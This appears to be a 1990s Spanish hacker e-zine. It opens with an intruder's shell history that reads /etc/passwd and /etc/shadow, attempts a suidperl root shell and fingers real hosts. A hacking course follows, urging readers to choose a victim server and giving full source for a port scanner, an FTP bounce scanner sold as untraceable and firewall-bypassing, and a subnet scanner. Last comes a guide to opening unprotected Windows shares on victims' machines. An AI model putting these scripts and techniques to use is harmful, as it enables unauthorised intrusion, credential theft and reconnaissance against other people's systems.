  cd ..
  cd ..
  pwd
  who
  mail from
  mail from: nogo@nogood.com
  quit
  cd ..
  cd ..
  ls
  cd etc
  ls
  cat passwd
  su
  su ihu
  su
  mail
  ?
  who
  ps
  cat etc/passwd
  cd ..
  cd ..
  ls
  cd etc
  cat passwd
  ln /etc/passwd /var/tmp/dead.letter
  ln /etc/passwd /var/tmp/dea1d.letter
  mail from: non@non.com
  cat /etc/passwd
  cd /var/tmp/
  ls
  rm dea1d.letter
  cat dead.letter
  ls -l
  cat id*
  ftp
  ftp -n localhost
  who
  ps
  ps -la
  #/usr/bin/suidperl -U
  >=0;
  $<=0; $<=0;
  >=0; $<=0;
  exec("bin/sh:);
  ls
  ls
  who
  cat /etc/passwd
  export RESOLV_HOST_CONF=</etc/shadow>
  cat /etc/shadow
  cd /var/log
  ls
  cat messages
  ls -l
  who
  bash
  makefile
  ls
  run makefile
  make all
  make *.c
  mkd m
  mk m
  man mdk
  man md
  man mkd
  man make
  make -f makefile
  cat makefile
  ls ma*
  cd ..
  ls
  cd cmeinel
  ls
  make -f makefile
  ls m*
  cd ..
  pwd
  ls
  cd cmeinel
  cat makefile
  ls
  make -f MAKEFILE
  ls
  make all
  make -f MAKEFILE all
  ls
  cat getpass.o
  cat getpass.c
  ls
  telnet
  cd /tmp
  ls
  dir li*
  cd..
  cd ..
  ls
  cd usr
  ls
  cd ..
  cd ..
  ls
  cd etc
  ls
  cd ..
  ls
  cd home
  cd cmeinel
  ls
  rm getpass.c
  rm getpass.o
  rm OPENLOG.C
  rm MAKEFILE
  ls
  dir
  ls -l
  w
  ls -l /bin
  pwd
  nslookup
  finger root@shellonly.com
  ls -l
  telnet
  tin
  wheris tin
  whereis tin
  who
  finger root
  users
  who
  tin
  finger @shellonly.com
  netstat
  quit
  exit
  tin
  tin -r
  tin -r news.lobo.net
  who
  talk campress
  man tin
  kill man tin
  fg man tin
  jobs
  kill 1
  ps man tin
  ps
  kill 23287
  ps
  quit
  exit
  i
  pine
  ls
  ls
  w
  ls -F
  more "=0"
  ls -l
  more binmail.sh
  ls
  more ed.hup ^
  more ed.hup
  more /var/spool/mail/cmeinel
  ls
  ls balu
  rm -rf balu
  finger
  w
  ls
  cd ..
  ls
  ls -l
  cd ftp
  ls
  cd pub
  ls
  cd ..
  ls
  cd incoming
  ls
  cd ..
  cd usr
  ls
  cd bin
  ls
  cd ..cd ..
  cd ..
  cd..
  cd ..
  ls
  w 
  exit
  tin -r
  tin -r news.lobo.net
  tin news.lobo.net -r
  elm
  pine
  telnet space.honeywell.com
  passwd
  tin
  tin -r news.lobo.net
  pine
  exit
  who
  talk .The Internet weather report
     No, we're not talking climate-type weather here on earth as reported
     via the Internet. We're talking bitwise weather. Storms in the aether.
     The ebb and flow, the squalls and bottlenecks on the largest Net back-
     bone carriers. The folks at ClearInk [25], a California "E-vertising"
     agency, offer the indispensible Internet Weather Report [26]: a quick-
     loading tabular summary, updated every 15 minutes, of packet loss and
     "ping" round-trip times from their location to 15 nationwide carriers.
     At this moment AGIS is losing 8% of the packets ClearInk sends them.
     Why? Perhaps it's due to the hackings, flames, and vandalism [27] dir-
     ected against this ISP, the only remaining safe haven for "spam king"
     Sanford Wallace's Cyber Promotions. (For more on CyberPromo, visit
     TBTF Threads [28] and follow one of the two spam topics.)
     [25] <URL:http://www.clearink.com/>
     [26] <URL:http://www.internetweather.com/>
     [27] <URL:http://www.news.com/Rumors/0%2C29%2C00.html>
     [28] <URL:http://www.tbtf.com/threads.html>
  finger rlogan@space.honeywell.com
  finger rlogan@honeywell.com
  nslookup honeywell.com
  whois rlogan@space.honeywell.com
  lynx http://www.honeywell.com
  finger info-fl51@space.honeywell.com
  telnet space.honeywell.com
  users
  who
  rwho
  finger campress
  elm
  quit
  exit
  whois honeywell.com
  finger rlogan@space.honeywell.com
  finger rlogan@129.239.26.10
  finger rlogan@129.30.3.16
  finger rlogan@129.17.254.12
  pine
  telnet 36.26.0.172
  finger boeing.com
  finger @boeing.com
  finger @www.boeing.com
  exit
  elm
  tin -r
  tin -r news.lobo.net
  whois happyhacker.org
  pine
  exit
  pine
  tin
  tin -r  news.lobo.net
  exit
  pico .forward
  pine
  tin -r news.lobo.net
  who
  quit
  exit
  pine
  tin
  who
  exit
  dig escape.com
  telnet free.escape.com
  exit
  pine
  tin
  tin -r news.lobo.net
  telnet obscure.sekurity.org 22
  who
  finger @
  set prompt = Howdy, haxor buddy!
  set prompt = 'Howdy, haxor buddy!'
  exit
  set
  set |more
  set prompt
  set prompt = 'hax0rch1ck:)'
  who
  pico .cshrc
  tty
  exit
  whois internic.net
  pine
  nslookup internic.net
  whois techbroker.com
  whois happyhacker.org
  whois happyhacker.com
  exit
  telnet escape.com 79
  exit
  nslookup phuck.com
  nslookup phuck.net
  dig netral.
  nslookup netral.
  whois  208.128.37.4
  nslookup phuck.net.
  nslookup ljusdal.se
  dig ljusdal.se
  dig phuch.net
  dig phuck.net
  help dig
  man dig
  whois dimensional.com
  exit
  lynx http://amazon.com
  lynx happyhacker.org
  whois techbroker.com
  pine
  who
  exit
  elm
  elm
  exit
  elm
  exit
  elm
  cat var/spool/mail/cmeinel
  exit
  tin
  tin -r news.lobo.net
  pine
  pine
  pine
  traceroute obscure.sekurity.org
  who
  an traceroute
  man traceroute
  finger krees@downeast.net
  telnet downeast.net 79
  telnet downeast.net 79
  telnet downeast.net 79
  whois downeast.net
  traceroute downeast.net
  finger krees@alter.net
  finger krees@137.39.13.237
  finger krees@204.176.212.1
  telnet 204.176.212.1 79
  finger krees@208.128.23.61
  nslookup 204.176.212.1
  nslookup 204.176.212.2
  dig 204.176.212.1
  nslookup 204.176.212.
  nslookup 204.176.212.10
  lynx http://www.agate.net/~krees/resume.html
  reset
  who
  pine
  exit
  traceroute sekurity.org
  pine
  exit
  pine
  exit
  pine
  lynx http://www.asmodeus.com
  whois asmodeus.com
  pine
  pine
  exit
  traceroute  ipt-q1.proxy.aol.com
  lynx http://204.188.52.99
  reset
  pine
  who
  exit
  pine
  exit
  lynx http://dejanews.com
  exit
  pine
  pico worm.tar
  ftp ftp://obscure.sekurity.org
  exit
  exit
  lynx http://www.westcomm.com/direcpc
  pine
  exit
  whois nwark.com
  finger
  who
  users
  finger@
  telnet 127.0.0.1 79
  finger utep
  finger austin
  finger elpaso
  exit
  pine
  exit
  pine
  telnet 127.0.0.1

------------ FIN -------------------------------------------------------------

        Si algun lector quiere escribir un articulo explicando el log, lo
  pondremos encantados en el siguiente numero :)

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                             - CURSO DE HACK - 
                                CHAPTER III

        Bueno, ya estamos en la tercera entrega de este curso sobre hack y
  espero que os sirva para algo y ya hallais hackeado algun server :). Ahora
  ya despues de estar haciendo cosas muy lamers ya empezaremos algo mas serio
  y que requiere un poco de maestria, pero no te preocupes que aqui estara
  todo bien explicado.

        Esta tercera parte esta enfocada al analisis de un server y buscar
  sus puntos vulnerables, enfocadonos en sistemas Unix logicamente.

  - Buscando victima.

        Lo primero que tenemos que hacer es buscar un sever que por alguna
  razon nos llame la atencion, los principales criterios serian estos:

    -> El servidor de la escuela, universidad, etc ...
    -> Sabemos que el Admin es un inutil.
    -> Nos lo a recomendado un amigo.
    -> Es un servidor racista, contiene pornografia infantil, etc ...
    -> Buscando por Inet, lo encontramos interesante.
    -> Contiene mi juego favorito pero vale un ri¤on.

        Ahora ya sabemos cual sera nuestra victima, comenzaremos un estudio,
  es recomendable crear un fichero donde iremos guardando toda la informacion
  que vayamos obteniendo del servidor en cuestion.

  - Surfeando los Puertos.

        Lo primero seria averiguar que puertos tiene abiertos que podemos
  aprovechar para colarnos. Por eso tenemos que usar un scaneador de puertos,
  la verdad es que hay muchos y para todos los s.o. practicamente. Ahora os
  pongo el codigo de uno para unix.

------------ Codigo Fuente ---------------------------------------------------

/*
 * internet port scanner 
 *
 * This program will scan a hosts TCP ports printing all ports that accept
 * connections, and if known, the service name.
 * This program can be trivially altered to do UDP ports also.
 *
 * Kopywrong (K) Aug. 25, '94 pluvius@io.org
 *
 * Hey kiddies, this is a C program, to run it do this:
 * $ cc -o pscan pscan.c
 * $ pscan <host> [max port]
 *
 * No, this will not get you root.
 * 
 * Changes:
 * Changed fprintf to printf in line 34 to work with my Linux 1.1.18 box
 * Netrunner 1/18/95 11:30pm
 *
 * Changes:
 * converts port# to network byte order.
 * Therapy 10/29/96 9:00pm
 * 
*/
static char sccsid[] = "@(#)pscan.c     1.0     (KRAD) 08/25/94";
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define MAX_PORT 1024 /* scan up to this port */
int s;
struct sockaddr_in addr;
char rmt_host[100];

int skan(port)
int port;
{
 int r;
    s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) {
       /* fprintf("ERROR: socket() failed\n"); */
       /* Changed to printf for my Linux 1.1.18 box */
       printf("ERROR: socket() failed\n");
       exit(0);
    }

    addr.sin_family = PF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(rmt_host);

    r = connect(s,(struct sockaddr *) &addr, sizeof(addr));

    close(s);
    if (r==-1) {
       return (1 == 0);
    }

    return (1 == 1);
}

main(argc,argv) 
int argc;
char *argv[];
{
 int a,b,c,d,e,f;
 struct hostent *foo;
 struct servent *bar;

   if (argc < 2) {
      fprintf(stderr,"usage: %s <host> [highest port]\n",argv[0]);
      exit(0);
   }

   if (sscanf(argv[1],"%d.%d.%d.%d",&a,&b,&c,&d) != 4) {
      foo = gethostbyname(argv[1]);
      if (foo == NULL) {
         fprintf(stderr,"error: cannot resolve host %s\n",argv[1]);
         exit(0);
      }
      sprintf(rmt_host,"%d.%d.%d.%d",(unsigned char )foo->h_addr_list[0][0],
              (unsigned char ) foo->h_addr_list[0][1], 
              (unsigned char ) foo->h_addr_list[0][2], 
              (unsigned char ) foo->h_addr_list[0][3]);
   } else {
      strncpy(rmt_host,argv[1],99);
   }


   if (argc > 2) {
      f = atoi(argv[2]);
   } else
      f = MAX_PORT;

   fprintf(stdout,"Scanning host %s - TCP ports 1 through %d\n",rmt_host,f);

   for (e =1;e<=f;e++) {
    char serv[100];
      if (skan(e)) {
         bar = getservbyport(htons(e),"tcp"); 
         printf("%d (%s) is running.\n",e,(bar == NULL) ? "UNKNOWN" :
                bar->s_name); 
      }
   }
}

------------ FIN -------------------------------------------------------------

        Ahora solo tenemos que compilarlo y ejecutarlo :))

        He creido que este escanedor que os doy mas abajo podria ser
  interesante para nuestros propositos ya que nos permite escanear un
  servidor pasando por otro servidor aprovechando un bug en el protocolo FTP.

------------ Codigo Fuente ---------------------------------------------------

/*
 * FTP Scan (C) 1996 Kit Knox <kit@connectnet.com>
 *
 * Exploits bug in FTP protocol that allows user to connect to arbritary
 * IP address and port.
 *
 * Features: Untraceable port scans.  Bypass firewalls!
 *
 * Example usage:
 *
 * ftp-scan ftp.cdrom.com 127.0.0.1 0 1024
 *
 * This will scan IP 127.0.0.1 from ftp.cdrom.com from port 0 to 1024
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

int sock;
char line[1024];

void rconnect(char *server)
{
  struct sockaddr_in sin;
  struct hostent *hp;

  hp = gethostbyname(server);
  if (hp==NULL) {
    printf("Unknown host: %s\n",server);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = htons(21);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  connect(sock,(struct sockaddr *) &sin, sizeof(sin));
}

void login(void)
{
  char buf[1024];

  sprintf(buf,"USER ftp\n");
  send(sock, buf, strlen(buf),0);
  sleep(1);
  sprintf(buf,"PASS user@\n");
  send(sock, buf, strlen(buf),0);
}

void readln(void)
{
  int i,done=0,w;
  char tmp[1];

  sprintf(line,"");
  i = 0;
  while (!done) {
    w=read(sock,tmp, 1, 0);
    if (tmp[0] != 0) {
      line[i] = tmp[0];
    }
    if (line[i] == '\n') {
      done = 1;
    }
    i++;
  }
  line[i] = 0;
}

void sendln(char s[1024]) {
  send(sock, s, strlen(s),0);
}

#define UC(b)   (((int)b)&0xff)

void main(int argc, char **argv)
{
  char buf[1024];
  int i;
  u_short sport,eport;
  register char *p,*a;
  struct hostent *hp;
  struct sockaddr_in sin;
  char adr[1024];

  if (argc != 5) {
    printf("usage: ftp-scan ftp_server scan_host loport hiport\n");
    exit(-1);
  }

  hp = gethostbyname(argv[2]);
  if (hp==NULL) {
    printf("Unknown host: %s\n",argv[2]);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);

  rconnect(argv[1]);
  /* Login anon to server */
  login();
  /* Make sure we are in */
  for (i=0; i<200; i++) {
    readln();
    if (strstr(line,"230 Guest")) {
      printf("%s",line);
      i = 200;
    }
  }
  a=(char *)&sin.sin_addr;
  sport = atoi(argv[3]);
  eport = atoi(argv[4]);
  sprintf(adr,"%i,%i,%i,%i",UC(a[0]),UC(a[1]),UC(a[2]),UC(a[3]));
  for (i=sport; i<eport; i++) {
    sin.sin_port = htons(i);
    p=(char *)&sin.sin_port;
    sprintf(buf,"\nPORT %s,%i,%i\nLIST\n",adr,UC(p[0]),UC(p[1]));
    sendln(buf);
    sprintf(line,"");
    while (!strstr(line, "150") && !strstr(line,"425")) {
      readln();
    }
    if (strstr(line,"150")) {
      printf("%i connected.\n",i);
    }
  }
  close(sock);
}

------------ FIN -------------------------------------------------------------

        Ahora ya sabemos que puertos tiene abiertos el servidor victima, 
  buscamos una lista y comparamos y asi podemos buscar bug para los puertos
  que el server tenga abiertos. Tranquilo que ahora viene un listado de
  puertos.

------------ Listado de Puertos ----------------------------------------------

  echo                7/tcp
  echo                7/udp
  discard             9/tcp    sink null
  discard             9/udp    sink null
  systat             11/tcp
  systat             11/tcp    users
  daytime            13/tcp
  daytime            13/udp
  netstat            15/tcp
  qotd               17/tcp    quote
  qotd               17/udp    quote
  chargen            19/tcp    ttytst source
  chargen            19/udp    ttytst source
  ftp-data           20/tcp
  ftp                21/tcp
  telnet             23/tcp
  smtp               25/tcp    mail
  time               37/tcp    timserver
  time               37/udp    timserver
  rlp                39/udp    resource      # resource location
  name               42/tcp    nameserver
  name               42/udp    nameserver
  whois              43/tcp    nicname       # usually to sri-nic
  domain             53/tcp    nameserver    # name-domain server
  domain             53/udp    nameserver
  nameserver         53/tcp    domain        # name-domain server
  nameserver         53/udp    domain
  mtp                57/tcp                  # deprecated
  bootp              67/udp                  # boot program server
  tftp               69/udp
  rje                77/tcp    netrjs
  finger             79/tcp
  link               87/tcp    ttylink
  supdup             95/tcp
  hostnames         101/tcp    hostname      # usually from sri-nic
  iso-tsap          102/tcp
  dictionary        103/tcp    webster
  x400              103/tcp                  # ISO Mail
  x400-snd          104/tcp
  csnet-ns          105/tcp
  pop               109/tcp    postoffice
  pop2              109/tcp                  # Post Office
  pop3              110/tcp    postoffice
  portmap           111/tcp
  portmap           111/udp
  sunrpc            111/tcp
  sunrpc            111/udp
  auth              113/tcp    authentication
  sftp              115/tcp
  path              117/tcp
  uucp-path         117/tcp
  nntp              119/tcp    usenet        # Network News Transfer
  ntp               123/udp    ntpd ntp      # network time protocol (exp)
  nbname            137/udp
  nbdatagram        138/udp
  nbsession         139/tcp
  NeWS              144/tcp    news
  sgmp              153/udp    sgmp
  tcprepo           158/tcp    repository    # PCMAIL
  snmp              161/udp    snmp
  snmp-trap         162/udp    snmp
  print-srv         170/tcp                  # network PostScript
  vmnet             175/tcp
  load              315/udp
  vmnet0            400/tcp
  sytek             500/udp
  biff              512/udp    comsat
  exec              512/tcp
  login             513/tcp
  who               513/udp    whod
  shell             514/tcp    cmd           # no passwords used
  syslog            514/udp
  printer           515/tcp    spooler       # line printer spooler
  talk              517/udp
  ntalk             518/udp
  efs               520/tcp                  # for LucasFilm
  route             520/udp    router routed
  timed             525/udp    timeserver
  tempo             526/tcp    newdate
  courier           530/tcp    rpc
  conference        531/tcp    chat
  rvd-control       531/udp    MIT disk
  netnews           532/tcp    readnews
  netwall           533/udp                  # -for emergency broadcasts
  uucp              540/tcp    uucpd         # uucp daemon
  klogin            543/tcp                  # Kerberos authenticated rlogin
  kshell            544/tcp    cmd           # and remote shell
  new-rwho          550/udp    new-who       # experimental
  remotefs          556/tcp    rfs_server rfs# Brunhoff remote filesystem
  rmonitor          560/udp    rmonitord     # experimental
  monitor           561/udp                  # experimental
  garcon            600/tcp
  maitrd            601/tcp
  busboy            602/tcp
  acctmaster        700/udp
  acctslave         701/udp
  acct              702/udp
  acctlogin         703/udp
  acctprinter       704/udp
  elcsd             704/udp                  # errlog
  acctinfo          705/udp
  acctslave2        706/udp
  acctdisk          707/udp
  kerberos          750/tcp    kdc           # Kerberos authentication--tcp
  kerberos          750/udp    kdc           # Kerberos authentication--udp
  kerberos_master   751/tcp                  # Kerberos authentication
  kerberos_master   751/udp                  # Kerberos authentication
  passwd_server     752/udp                  # Kerberos passwd server
  userreg_server    753/udp                  # Kerberos userreg server
  krb_prop          754/tcp                  # Kerberos slave propagation
  erlogin           888/tcp                  # Login and environment passing
  kpop             1109/tcp                  # Pop with Kerberos
  phone            1167/udp
  ingreslock       1524/tcp
  maze             1666/udp
  nfs              2049/udp                  # sun nfs
  knetd            2053/tcp                  # Kerberos de-multiplexor
  eklogin          2105/tcp                  # Kerberos encrypted rlogin
  rmt              5555/tcp    rmtd
  mtb              5556/tcp    mtbd          # mtb backup
  man              9535/tcp                  # remote man server
  w                9536/tcp
  mantst           9537/tcp                  # remote man server, testing
  bnews           10000/tcp
  rscs0           10000/udp
  queue           10001/tcp
  rscs1           10001/udp
  poker           10002/tcp
  rscs2           10002/udp
  gateway         10003/tcp
  rscs3           10003/udp
  remp            10004/tcp
  rscs4           10004/udp
  rscs5           10005/udp
  rscs6           10006/udp
  rscs7           10007/udp
  rscs8           10008/udp
  rscs9           10009/udp
  rscsa           10010/udp
  rscsb           10011/udp
  qmaster         10012/tcp
  qmaster         10012/udp

------------ FIN -------------------------------------------------------------

        No he includo los puertos asignados al s.o. Inferno ya que por
  ahora es muy dificil que encontremos un server con este magnifico s.o. En el
  listado siguiente encontrareis un curioso escaneador pero no de puertos
  sino de dominios, que nos sera util para sacar los subdominios de un server.
  Deciros que este codigo no es un programa en C sino un script en Perl.

------------ Codigo Fuente ---------------------------------------------------

#!/usr/local/bin/perl -s
#
#   Scan a subnet for valid hosts; if given hostname, will look at the
# 255 possible hosts on that net.  Report if host is running rexd or
# ypserv.
#
#  Usage:  scan n.n.n.n

# mine, by default
$default = "130.80.26";

$| = 1;

if ($v) { $verbose = 1; }

if ($#ARGV == -1) { $root = $default; }
else { $root = $ARGV[0]; }

# ip address
if ($root !~ /[0-9]+\.[0-9]+\.[0-9]+/) {
        ($na, $ad, $ty, $le, @host_ip) = gethostbyname($root);
        ($one,$two,$three,$four) = unpack('C4',$host_ip[0]);
        $root = "$one.$two.$three";
        if ($root eq "..") { die "Can't figure out what to scan...\n"; }
        }

print "Subnet $root:\n" if $verbose;
for $i (01..255) {
        print "Trying $root.$i\t=> " if $verbose;
        &resolve("$root.$i");
        }

#
#  Do the work
#
sub resolve {

local($name) = @_;

# ip address
if ($name =~ /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/) {
        ($a,$b,$c,$d) = split(/\./, $name);
        @ip = ($a,$b,$c,$d);
        ($name) = gethostbyaddr(pack("C4", @ip), &AF_INET);
        }
else {
        ($name, $aliases, $type, $len, @ip) = gethostbyname($name);
        ($a,$b,$c,$d) = unpack('C4',$ip[0]);
        }

if ($name && @ip) {
       print "$a.$b.$c.$d\t$name\n";
       system("if ping $name 5 > /dev/null ; then\nif rpcinfo -u
       $name 100005 > /dev/null ; then showmount -e $name\nfi\nif rpcinfo -t
       $name 100017 > /dev/null ; then echo \"Running rexd.\"\nfi\nif rpcinfo
       -u $name 100004 > /dev/null ; then echo \"R
unning ypserv.\"\nfi\nfi");
        }
else { print "unable to resolve address\n" if $verbose; }

}

sub AF_INET {2;}

------------ FIN -------------------------------------------------------------

        Espero que por el momento os haya quedado claro el surfeo de puertos
  y en la siguiente entrega del curso o sea CURSO HACK IV seguiremos el
  analisis de un server mediente comandos de unix y definiremos los puntos
  vulnerables de un server.

  Byes all y hasta la vista !!

                                                     CONDE VAMPIRO
                                               - J.J.F. / HACKERS TEAM -

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
------------------------------------------------------------------------------
*********** USO DE SAMBA EN LINUX/UNIX COMO SUSTITUTO DEL NBTSTAT ************
******************************** By  Enif. ***********************************
______________________________________________________________________________
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

  1. Introduccion.

        El Bug del NBTSTAT era una de las cosas que aun me ataban a mi pobre
  windows, cuando lo escuche por primera vez fui una victima de el. Se
  trataba de que se podia acceder a los archivos de un ordenador con 
  win NT/95 que los tubiera compartidos para su red local si no tenia 
  puesto password para usar los recursos. Parece una cosa realmente 
  estupida, nos lo han de dar todo hecho, pues si!! eso mismo, pero la 
  realidad es que de ahi viene todo el problema, es un bug debido a una
  mala administracion de los recursos, propiciada por la falta de infor-
  macion que da Micro$oft da a sus clientes. Os digo por experiencia que 
  la mayoria de gente son absolutamente inconscientes de que alguien puede
  acceder a su red local por TCP/IP, yo era uno de ellos cuando me entraron
  y todo eso debido a mi gran "colega" -Psico- ..... bueno eso son detalles
  le agradezco al menos que no me hiciera desastres.
   
        En fin al principio creia que esto era propio de redes micro$oft, pero 
  no es asi. En Linux/UNIX existe una implementacion de este soft que 
  suele conocerse como Samba o LanManager. Ademas no es cosa de magia, en 
  realidad las dos redes estan separaditas, la LOCAL y la Mundial... TCP/IP
  pero existe un API, llamada netbios que resulta ser una serie de primitvas
  comtempladas que hacen de pasarela entre una y otra. Este protocolo de 
  aplicacion en versiones de micro$oft es un verdadero desastre , por que 
  ademas fue el causante de los famosos NUKES y tal y tal.... osea que todo
  esto os deberia de servir a todos para saber que WINDOWS no es un buen 
  sistema operativo para conectarse a Inet. 
 
      
  2. Instrucciones del uso del smbclient como sustituto de nbtstat.

     
        Lo primero que necesitamos es instalarnos una version del samba. 
  Bueno esto no ha de ser problema, pues suele venir en la mayoria de
  las distribuciones de Linux, por propia experiencia os dire que viene
  en la REDHAT 4.0 - 5.0. Si haceis una instalacion normal incluyendo 
  la opcion de conectividad con windows MSDOS ya se os metera directamente.
  
        Bueno, una vez metido el samba, tendreis instalado un servidor de 
  recursos compartidos, esto no es ofensivo para vosotros mediante esta
  tecnica pero cuidadin! por que la verdad es que el samba es un demonio
  bastante xplotable, y podriais encontraros sorpresas cuando os conectarais.
  Para solucionar esto , o bien lo matais antes de conectaros, cosa que es
  facil, solo habeis de buscar con "ps -ax" entre los procesos activos, como
  smbd (tambien debereis matar nmbd que esta relacionado con el samba pero 
  ahora no me enrollare en comentaros para que sirve, si teneis curiosidad:
  "man nmbd" o nmbd --help) , localizais el pid y luego "kill -9 pid".
  Otra solucion es copiarse el smbclient y luego desinstalarse el paquete 
  del samba. Esto ultimo es mas eficiente pero no lo recomiendo, por que si
  teneis metido el samba en vuestra maquina podeis hacer pruebas de esto mismo
  o de los diversos xploits que actuan sobre el. Ademas no he probado esta
  opcion, asi que no os aseguro que el smbclient no dependa de ningun recurso
  mas que se meten/configuran al instalar el samba. Si lo probais y funciona
  os agradeceria que me lo comunicarais.
   
        Bueno, pues se supone que ya debes tener metido el samba en tu maquina
  lo primero que puedes hacer es poner lo siguiente:
   
   smbclient           
   
  Te deberia aparecer lo siguiente  maomeno:
 
   Usage: smbclient service <password> [-p port] [-d debuglevel] [-l log] 
   Version 1.9.17p4
	-p port               listen on the specified port
	-d debuglevel         set the debuglevel
	-l log basename.      Basename for log/debug files
	-n netbios name.      Use this name as my netbios name
	-N                    don't ask for a password
	-P                    connect to service as a printer
	-M host               send a winpopup message to the host
	-m max protocol       set the max protocol level
	-L host               get a list of shares available on a host
	-I dest IP            use this IP to connect to
	-E                    write messages to stderr instead of stdout
	-U username           set the network username
	-W workgroup          set the workgroup name
	-c command string     execute semicolon separated commands
	-T<c|x>IXgbNa          command line tar
	-D directory          start from directory
	
   
	 
        Bueno, todas estas opciones son muy bonitas :) y sirven para diversas
  cosas, incluso puedes hacerles bromitas a la gente que tenga metido los
  mensajes emergentes, enviandole notitas con esta herramienta. Si quereis
  probar mirar la opcion -M.
    
  Para hacer lo del nbtstat deberemos usar la opcion -L:
    
    smbclient -L "dns_victima"
    
        Ojo , aqui solo admite dns, pero para eso no hay problemo, si sabes la 
  ip tranquilamente haces un "nslookup ip" y te dara la dns.
    
    Esto nos dara algo asin maomeno:	
	
     	
    Added interface ip=192.168.0.2 bcast=192.168.0.255 nmask=255.255.255.0
    Unknown socket option TCP_NODELAY
    Server time is Tue Jan 27 22:54:18 1998
    Timezone is UTC+1.0
    Domain=[WORKGROUP] OS=[Unix] Server=[Samba 1.9.17p4]
    connected as guest security=user

    Server=[LOCALHOST] User=[nobody] Workgroup=[WORKGROUP] Domain=[WORKGROUP]

	Sharename      Type      Comment
	---------      ----      -------
	IPC$           IPC       IPC Service (Samba 1.9.17p4)
        X              Disk      "<--- recurso compartido" 

    This machine has a browse list:

	Server               Comment
	---------            -------
	VICTIMA               Samba 1.9.17p4


    This machine has a workgroup list:

	Workgroup            Master
	---------            -------
	OTHERGROUP           OTHER
	WORKGROUP            VICTIMA

  Las ip,bcast y nmask del ejemplo son simbolicas. 
	
	
        Esto significa que el macho comparte recursos, es muy buena senal.
  Tambien es buena senal que no os pida password por que no es seguro 
  que esto se pueda llegar a hacer sin autentificacion, si os lo pide 
  podeis probar a darle al enter, debido a que muchos servicios de este
  tipo no tienen passwd, sobretodo los de win.(recordad que algunas 
  maquinas UNIX tambien lo dan)
   
        Con esto ya tendreis a la victima localizada y sabreis su nombre de 
  netbios. En este ejemplo es VICTIMA.
    

  3. Instrucciones de uso del net view \\....
    
    
        Bueno ahora viene lo mas interesante y lo realmente  efectivo.
  He de deciros que hasta ahora no hemos creado una conexion con la 
  victima, solo hemos pedido informacion sobre su nombre y los recursos 
  que comparte. En esto es lo interviene el nmbd, en el servicio de 
  nombres de netbios y tal y tal...
    
  Para hacer lo del net view hemos de ejecutar lo siguiente:
    
  En una red local normal bastaria con  hacer :
    
    smbclient \\\\VICTIMA\\recurso 
    
  para que apareciera el esperado prompt que nos asegura que hemos conectado
    
                    smb>
    
        Esto es debido a que el cliente envia un broadcast por la red local
  pidiendo informacion del servidor VICTIMA, y este se encargaria de 
  enviarnos una respuesta. Pero en Inet no se puede hacer un mega broadcast
  de guais a ver si nos contestan chorrocientos servidores con el mismo 
  nombre por esas malditas casulidades de esta vida. 
  Entonces deberemos ayudar al cliente a encontrar a ese nuestro "amigo"
  servidor VICTIMA, como se hace esto? facil:
    
    smbclient \\\\VICTIMA\\recurso -I ip_victima
    
        y yasta, luego nos pedira password seguramente y solo hay que probar
  hasta donde llega la ignorancia de ese susodicho administrador 
  propietario de la maquina, es decir a ver si ha puesto pass o no. 
    
        Que por que 4 BARRAS "\"? pues no se pero es la formalidad, sino no
  funa, y la verdad es que eso me hizo partirme los cuernos buscando por
  que no me conectaba al principio... pero por fin!!! yasta
    
        Bueno no mas, solo deciros que a partir de ahi es como un FTP, muy
  facilito si no sabeis como empezad probad con "h" o con "?" y nada los
  tipicos ls, cd... y tal y tal...
    
    
